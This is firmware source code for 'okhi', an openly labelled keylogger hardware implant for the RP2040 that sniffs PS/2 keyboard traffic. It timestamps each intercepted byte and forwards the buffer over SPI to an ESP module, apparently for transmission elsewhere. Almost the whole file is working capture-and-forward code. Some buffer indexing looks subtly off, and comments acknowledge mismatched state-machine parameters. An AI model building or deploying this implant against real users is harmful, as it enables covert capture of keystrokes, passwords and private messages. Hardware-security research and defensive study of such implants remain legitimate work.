/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

// I'm still a novice with the Pico SDK & RP2040, so please bear with me if there are unnecessary things ;-)

// This project assumes that copy_to_ram is enabled, so ALL code is running from RAM

#include "hardware/clocks.h"
#include "hardware/flash.h"
#include "hardware/irq.h"
#include "hardware/pio.h"
#include "hardware/pll.h"
#include "hardware/regs/io_qspi.h"
#include "hardware/spi.h"
#include "hardware/structs/clocks.h"
#include "hardware/structs/ioqspi.h"
#include "hardware/structs/pll.h"
#include "hardware/structs/sio.h"
#include "hardware/sync.h"
#include "hardware/timer.h"
#include "hardware/uart.h"
#include "hardware/watchdog.h"
#include "okhi.pio.h"
#include "pico/bootrom.h"
#include "pico/multicore.h"
#include "pico/stdlib.h"
#include <stdio.h>
#include <string.h>

#include "../../../../last_firmv.h"

#include "../../com/com.h"

// uncomment to enable dev build
// #define DEV_BUILD 1 // NOT USED YET

// This variant never changes the system clock, so clk_peri stays at 125 MHz and
// the PL022 lands on 125e6 / (2 * 13) = 4.81 MHz. Asking for 5 MHz cannot hit it
// exactly; spi_set_baudrate() always rounds DOWN to an achievable rate.

#define RP_VARIANT OKHI_VARIANT_PS2
#define OTA_WATCHDOG_UPDATE() watchdog_update()

#include "../../com/com_rp.h"

#include "../../com/com_rp_hw.h"

#include "../../com/com_rp_ota.h"

// --- PS/2 bus + PIO helper pins --------------------------------------------------
// These four GPIOs must keep THIS numeric order. The capture programs use DAT_GPIO as their
// input base, so the SDK sees DAT at "in pin 0" and CLK at "in pin 1" (CLK must be DAT+1).
// The two AUX pins are software-only JMP helpers the main core toggles to arm/abort the
// capture state machines.
// Must be in that order
#define AUX_H2D_JMP_GPIO 19 // PIO JMP HELPER PIN FOR HOST TO DEVICE PIO (must be a free GPIO pin)
#define DAT_GPIO 20         // PS/2 data
#define CLK_GPIO 21         // PS/2 clock
#define AUX_D2H_JMP_GPIO 22 // PIO JMP HELPER PIN FOR DEVICE TO HOST PIO (must be a free GPIO pin)

#define RING_BUFF_MAX_ENTRIES 800

// --- PS/2 capture state (shared between the PIO IRQs, the main loop and core1) ----
// ringbuff holds parsed PS/2 bytes as short timestamped ASCII strings that core1 drains to
// the ESP; write_index is the producer cursor. kbd_h2d_sm/kbd_sm and their offset_* identify
// the host->device and device->host state machines so the IRQs can restart them by name.
volatile static unsigned int write_index = 0;
volatile static char ringbuff[RING_BUFF_MAX_ENTRIES][32];
volatile static uint kbd_h2d_sm;
volatile static uint offset_kbd_h2d;
volatile static uint kbd_sm;
volatile static uint offset_kbd;
volatile static int inhnr;
volatile static bool last_state_idle;
volatile static int inidle;
volatile static int inidletoggle;
volatile static bool inh_fired;

// ---------------------------------------------------------------------------------
// Device->host capture SM control.
//
// The device_to_host PIO program is gated by AUX_D2H_JMP_GPIO (its JMP pin): while that pin
// is HIGH the program parks on its first instruction; while it is LOW it captures a byte.
// "restart" simply forces the SM's program counter back to the program's entry point.
// ---------------------------------------------------------------------------------
static void restart_device_to_host_sm(void)
{
    pio_sm_exec(pio0, kbd_sm, pio_encode_jmp(offset_kbd));
}

// Force the host->device SM back to its first instruction, so the next host transfer is
// captured cleanly from the start (used after inhibit/idle events).
static void restart_host_to_device_sm(void)
{
    pio_sm_exec(pio1, kbd_h2d_sm, pio_encode_jmp(offset_kbd_h2d));
}

// Disarm device->host capture: drive the arm pin HIGH to park the SM, spin until we read that
// HIGH back (so the level has actually propagated), then restart the SM at its parked entry.
static void stop_device_to_host_sm(void)
{
    gpio_put(AUX_D2H_JMP_GPIO, true);
    while (!gpio_get(AUX_D2H_JMP_GPIO))
    {
        tight_loop_contents();
    }
    restart_device_to_host_sm();
}

// Arm device->host capture: drop the arm pin LOW so the SM may leave its wait loop, then
// restart it at the top to begin a fresh capture on the next start bit.
static void start_device_to_host_sm(void)
{
    gpio_put(AUX_D2H_JMP_GPIO, false);
    restart_device_to_host_sm();
}

// =================================================================================
// PIO0 interrupt - bus-inhibit events raised by the inhibited_signal SM.
//
//   IRQ0 -> the host is INHIBITING the bus (CLOCK held low ~90 us). Disarm device->host
//           capture so a half-formed byte can never be pushed as garbage.
//   IRQ1 -> the inhibit ended with NO Request-to-Send (host released without sending).
//           Re-arm device->host capture and restart the host->device SM for whatever is next.
//
// Each branch first clears its own flag (write 1 to pio0_hw->irq) before acting.
// =================================================================================
// IRQ0: Inhibited communication detected
// IRQ1: No Host Request-to-Send detected after inhibiting communication
void pio0_irq(void)
{
    // printf("\r\nPIO0 IRQ!\r\n");
    if (pio0_hw->irq & 1)
    {
        // printf("PIO0 IRQ & 1: %d\r\n", inhnr++);
        pio0_hw->irq = 1;
        stop_device_to_host_sm();
    }
    else if (pio0_hw->irq & 2)
    {
        // printf("PIO0 IRQ & 2: %d\r\n", inhnr++);
        pio0_hw->irq = 2;
        start_device_to_host_sm();
        restart_host_to_device_sm();
    }
}

// =================================================================================
// PIO1 interrupt - idle events raised by the idle_signal SM.
//
//   IRQ0 -> the bus is IDLE (CLOCK and DATA both high long enough). Arm device->host capture
//           and restart the host->device SM so both are ready for the next packet.
//   IRQ1 -> not produced by the idle SM; the branch just clears the flag if it ever fires.
// =================================================================================
// IRQ0: IDLE DETECTED, CLOCK is HIGH + DAT is HIGH for at least 100 microseconds
void pio1_irq(void)
{
    // printf("\r\nPIO1 IRQ!\r\n");
    if (pio1_hw->irq & 1)
    {
        // printf("PIO1 IRQ & 1: %d\r\n", inidle++);
        pio1_hw->irq = 1;
        start_device_to_host_sm();
        restart_host_to_device_sm();
    }
    else if (pio1_hw->irq & 2)
    {
        // printf("PIO1 IRQ & 2: %d\r\n", inhnr++);
        pio1_hw->irq = 2;
    }
}

void core1_main()
{
    sleep_ms(2000);
    gpio_init(ESP_RESET_GPIO);
    gpio_set_dir(ESP_RESET_GPIO, GPIO_IN);
    gpio_pull_up(ESP_RESET_GPIO);
    sleep_ms(2000);

    esp_link_uart_init();

    for (int i = 0; i < 3000; i++)
    {
        if (gpio_get(ELOG_SLAVEREADY_GPIO))
        {
            printf("ESP slave not ready yet... %d\r\n", i);
        }
        else
        {
            break;
        }
        tight_loop_contents();
    }

    esp_link_master_init();

    unsigned int read_index = 0;
    unsigned int total_packets_sended = 0;
    while (1)
    {
        static unsigned char line[32] = {0};
        while (read_index != write_index)
        {
            sprintf((char *)line, "%s   \r\n", (char *)&(ringbuff[read_index % (RING_BUFF_MAX_ENTRIES - 1)][32]));
            gpio_put(EBOOT_MASTERDATAREADY_GPIO, true);

            if (!wait_esp_ready(SPI_READY_TIMEOUT_US))
            {
                gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);
                break;
            }

            gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);
            my_spi_write_blocking(line, strlen((char *)line));

            read_index++;
            printf("%s", line);
            total_packets_sended++;
        }

        poll_esp_if_due();
        report_packets_sent(total_packets_sended);
    }
}

int main(void)
{
    watchdog_disable();

    boot_press();
    ota_boot_check();
    blink_led(2);

    delay_boot_if_esp_reset_detected();

    rp_board_boot_init();

    printf("\r\nokhi PS2 started! Hardware v%s\r\nBuild Date %s %s\r\n", hwver_name, __DATE__, __TIME__);
    fflush(stdout);

    uint32_t baud __attribute__((unused)) = rp_spi_master_init();
    printf("SPI Mode 0: %.2f MHz (%d)\r\n", ((float)baud) / 1000000.0, baud);

    gpio_put(USOE_PIN, false);

    report_flash_layout();
    report_flash_size();
    report_ota_state();

    // GPIO configuration for all PIO programs:
    gpio_init(DAT_GPIO);
    gpio_set_dir(DAT_GPIO, GPIO_IN);
    gpio_pull_up(DAT_GPIO);
    gpio_init(CLK_GPIO);
    gpio_set_dir(CLK_GPIO, GPIO_IN);
    gpio_pull_up(CLK_GPIO);
    gpio_init(AUX_D2H_JMP_GPIO);
    gpio_set_dir(AUX_D2H_JMP_GPIO, GPIO_OUT);
    gpio_put(AUX_D2H_JMP_GPIO, false);
    gpio_init(AUX_H2D_JMP_GPIO);
    gpio_set_dir(AUX_H2D_JMP_GPIO, GPIO_OUT);
    gpio_put(AUX_H2D_JMP_GPIO, true);
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop");
    printf("CLK_GPIO: %d\r\n", gpio_get(CLK_GPIO));
    printf("DAT_GPIO: %d\r\n", gpio_get(DAT_GPIO));
    printf("JMP_AUX D2H: %d\r\n", gpio_get(AUX_D2H_JMP_GPIO));
    printf("JMP_AUX H2D: %d\r\n", gpio_get(AUX_H2D_JMP_GPIO));

    pio_destroy();

    // ===== HOST -> DEVICE capture SM (PIO1, program: host_to_device) =====
    // host to device:
    // get a state machine
    kbd_h2d_sm = pio_claim_unused_sm(pio1, true);
    // reserve program space in SM memory
    offset_kbd_h2d = pio_add_program(pio1, &host_to_device_program);
    // Set DAT and CLK (2 consecutive pins from DAT_GPIO) as PIO inputs.
    // NOTE: this passes kbd_sm, yet here that names the same SM as kbd_h2d_sm - kbd_sm is still
    // 0 at this point (its pio0 value is assigned later) and pio_claim_unused_sm() also returned
    // SM 0 on pio1 for kbd_h2d_sm. Pin directions apply at the GPIO level for the whole PIO too,
    // so DAT/CLK are configured as inputs correctly regardless.
    pio_sm_set_consecutive_pindirs(pio1, kbd_sm, DAT_GPIO, 2, false);
    // Build the default SM config (this fills in the .wrap_target/.wrap bounds).
    // NOTE: this calls device_to_host's getter, not host_to_device's. Both programs put
    // .wrap_target on their first instruction, but device_to_host is 15 instructions (wrap
    // bottom = offset+14) while host_to_device is 16 (offset+15). So the wrap bottom lands on
    // line 14 and the final 'skip_ack_bit' (line 15) ends up just outside the wrap loop. This is
    // harmless in practice: after the stop bit the SM wraps, re-clears the ISR and re-arms, and
    // the short (~30-50 us) ACK clock-low can't trip the ~90 us inhibit gate.
    pio_sm_config c_kbd_h2d = device_to_host_program_get_default_config(offset_kbd_h2d);
    // Set the base input pin. pin index 0 is DAT, index 1 is CLK
    sm_config_set_in_pins(&c_kbd_h2d, DAT_GPIO);
    // ISR shifts RIGHT, autopush DISABLED, push threshold 0. The captured byte therefore stays
    // in the ISR's most-significant byte and is read from the FIFO word's top byte in C.
    sm_config_set_in_shift(&c_kbd_h2d, true, false, 0);
    // JMP pin
    sm_config_set_jmp_pin(&c_kbd_h2d, CLK_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_kbd_h2d, PIO_FIFO_JOIN_RX);
    // Must run ~133.6 kHz, 7.5 microseconds per cycle
    // it is expected to have no fewer than 8 PIO state machine cycles for each keyboard clock cycle
    float div_kbd_h2d = (float)clock_get_hz(clk_sys) / (8 * 16700);
    sm_config_set_clkdiv(&c_kbd_h2d, div_kbd_h2d);
    // Initialize the state machine
    pio_sm_init(pio1, kbd_h2d_sm, offset_kbd_h2d, &c_kbd_h2d);
    pio_sm_set_enabled(pio1, kbd_h2d_sm, false);
    pio_sm_clear_fifos(pio1, kbd_h2d_sm);
    pio_sm_restart(pio1, kbd_h2d_sm);
    pio_sm_clkdiv_restart(pio1, kbd_h2d_sm);
    pio_sm_set_enabled(pio1, kbd_h2d_sm, true);
    pio_sm_exec(pio1, kbd_h2d_sm, pio_encode_jmp(offset_kbd_h2d));

    // ===== IDLE detector SM (PIO1, program: idle_signal, raises PIO1 IRQ0) =====
    // idle detection:
    // get a state machine
    uint kbd_idle_sm = pio_claim_unused_sm(pio1, true);
    // reserve program space in SM memory
    uint offset_idle = pio_add_program(pio1, &idle_signal_program);
    // Set pin directions base
    pio_sm_set_consecutive_pindirs(pio1, kbd_idle_sm, DAT_GPIO, 2, false);
    // program the start and wrap SM registers
    pio_sm_config c_idle = idle_signal_program_get_default_config(offset_idle);
    // Set the base input pin. pin index 0 is DAT
    sm_config_set_in_pins(&c_idle, DAT_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_idle, PIO_FIFO_JOIN_RX);
    // JMP pin (CLOCK)
    sm_config_set_jmp_pin(&c_idle, CLK_GPIO);
    // 1 MHz
    float div_idle = clock_get_hz(clk_sys) / 1000000.0;
    sm_config_set_clkdiv(&c_idle, div_idle);
    // Set IRQ handler
    pio_set_irq0_source_mask_enabled(pio1, 0x0F00, true);
    irq_set_exclusive_handler(PIO1_IRQ_0, pio1_irq);
    irq_set_enabled(PIO1_IRQ_0, true);
    // initialize the state machine
    pio_sm_init(pio1, kbd_idle_sm, offset_idle, &c_idle);
    pio_sm_set_enabled(pio1, kbd_idle_sm, false);
    pio_sm_clear_fifos(pio1, kbd_idle_sm);
    pio_sm_restart(pio1, kbd_idle_sm);
    pio_sm_clkdiv_restart(pio1, kbd_idle_sm);
    pio_sm_set_enabled(pio1, kbd_idle_sm, true);
    pio_sm_exec(pio1, kbd_idle_sm, pio_encode_jmp(offset_idle));

    // ===== INHIBIT detector SM (PIO0, program: inhibited_signal, raises PIO0 IRQ0/1) =====
    // inhibited detection:
    // get a state machine
    uint kbd_inh_sm = pio_claim_unused_sm(pio0, true);
    // reserve program space in SM memory
    uint offset_inh = pio_add_program(pio0, &inhibited_signal_program);
    // Set pin directions base
    pio_sm_set_consecutive_pindirs(pio0, kbd_inh_sm, DAT_GPIO, 2, false);
    // program the start and wrap SM registers
    pio_sm_config c_inh = inhibited_signal_program_get_default_config(offset_inh);
    // Set the base input pin. pin index 0 is DAT
    sm_config_set_in_pins(&c_inh, DAT_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_inh, PIO_FIFO_JOIN_RX);
    // JMP pin (CLOCK)
    sm_config_set_jmp_pin(&c_inh, CLK_GPIO);
    // 1 MHz
    float div_inh = clock_get_hz(clk_sys) / 1000000.0;
    sm_config_set_clkdiv(&c_inh, div_inh);
    // Set IRQ handler
    pio_set_irq0_source_mask_enabled(pio0, 0x0F00, true);
    irq_set_exclusive_handler(PIO0_IRQ_0, pio0_irq);
    irq_set_enabled(PIO0_IRQ_0, true);
    // initialize the state machine
    pio_sm_init(pio0, kbd_inh_sm, offset_inh, &c_inh);
    pio_sm_set_enabled(pio0, kbd_inh_sm, false);
    pio_sm_clear_fifos(pio0, kbd_inh_sm);
    pio_sm_restart(pio0, kbd_inh_sm);
    pio_sm_clkdiv_restart(pio0, kbd_inh_sm);
    pio_sm_set_enabled(pio0, kbd_inh_sm, true);
    pio_sm_exec(pio0, kbd_inh_sm, pio_encode_jmp(offset_inh));

    // ===== DEVICE -> HOST capture SM (PIO0, program: device_to_host) =====
    // device to host:
    // get a state machine
    kbd_sm = pio_claim_unused_sm(pio0, true);
    // reserve program space in SM memory
    offset_kbd = pio_add_program(pio0, &device_to_host_program);
    // Set DAT, CLK and the AUX arm pin (3 consecutive pins from DAT_GPIO) as PIO inputs.
    pio_sm_set_consecutive_pindirs(pio0, kbd_sm, DAT_GPIO, 3, false);
    // program the start and wrap SM registers
    pio_sm_config c_kbd = device_to_host_program_get_default_config(offset_kbd);
    // Set the base input pin. pin index 0 is DAT, index 1 is CLK
    sm_config_set_in_pins(&c_kbd, DAT_GPIO);
    // Active config below: ISR shifts RIGHT, autopush DISABLED, threshold 0. (The commented
    // line just above is the autopush-every-8-bits alternative, kept for reference, not used.)
    // sm_config_set_in_shift(&c_kbd, true, true, 8);
    sm_config_set_in_shift(&c_kbd, true, false, 0);
    // JMP pin = AUX_D2H_JMP_GPIO, the software arm/abort gate (NOT the PS/2 clock).
    sm_config_set_jmp_pin(&c_kbd, AUX_D2H_JMP_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_kbd, PIO_FIFO_JOIN_RX);
    // Must run ~133.6 kHz, 7.5 microseconds per cycle
    // it is expected to have no fewer than 8 PIO state machine cycles for each keyboard clock cycle
    float div_kbd = (float)clock_get_hz(clk_sys) / (8 * 16700);
    sm_config_set_clkdiv(&c_kbd, div_kbd);
    // Initialize the state machine
    pio_sm_init(pio0, kbd_sm, offset_kbd, &c_kbd);
    pio_sm_set_enabled(pio0, kbd_sm, false);
    pio_sm_clear_fifos(pio0, kbd_sm);
    pio_sm_restart(pio0, kbd_sm);
    pio_sm_clkdiv_restart(pio0, kbd_sm);
    pio_sm_set_enabled(pio0, kbd_sm, true);
    pio_sm_exec(pio0, kbd_sm, pio_encode_jmp(offset_kbd));

    start_device_to_host_sm();
    restart_host_to_device_sm();

    multicore_launch_core1(core1_main);
    sleep_ms(1);
    multicore_reset_core1();
    multicore_launch_core1(core1_main);

    // =================================================================================
    // Main capture loop - drain both RX FIFOs and log every parsed byte.
    //
    // Each PIO program leaves its 8-bit result in the TOP byte of the 32-bit FIFO word, so the
    // byte is read through an 8-bit view offset by +3 (see the ISR note in ps2.pio). Bytes are
    // tagged 'H' (host->device) or 'D' (device->host) with a timestamp and written to the ring
    // buffer; core1 ships those strings out. write_index is the producer cursor.
    // =================================================================================
    // If the capture loop ever stalls for >4 s, reboot.
    watchdog_enable(4000, 0);

    while (1)
    {
        bool got_byte = false;

        /* The pushed value is an 8-bit sample positioned in the upper (most significant) byte of the
         32-bit FIFO word, In C, you can read this byte from:

           io_rw_8* rxfifo_shift = (io_rw_8*)&pio->rxf[sm] + 3;

           This offset (+3) accesses the top byte of the 32-bit word in which the data resides. */
        if (!pio_sm_is_rx_fifo_empty(pio1, kbd_h2d_sm))
        {
            uint8_t byte = *((io_rw_8 *)&pio1->rxf[kbd_h2d_sm] + 3);
            sprintf((char *)&(ringbuff[write_index % (RING_BUFF_MAX_ENTRIES - 1)][32]), "%c:0x%02X t:0x%08X ; ", 'H',
                    byte, us_to_ms(time_us_64()));
            write_index++;
            got_byte = true;
        }
        if (!pio_sm_is_rx_fifo_empty(pio0, kbd_sm))
        {
            uint8_t byte = *((io_rw_8 *)&pio0->rxf[kbd_sm] + 3);
            sprintf((char *)&(ringbuff[write_index % (RING_BUFF_MAX_ENTRIES - 1)][32]), "%c:0x%02X t:0x%08X ; ", 'D',
                    byte, us_to_ms(time_us_64()));
            write_index++;
            got_byte = true;
        }

        if (got_byte)
        {
            capture_note_traffic();
        }
        else
        {
            capture_note_idle();
        }
    }

    return 0;
}
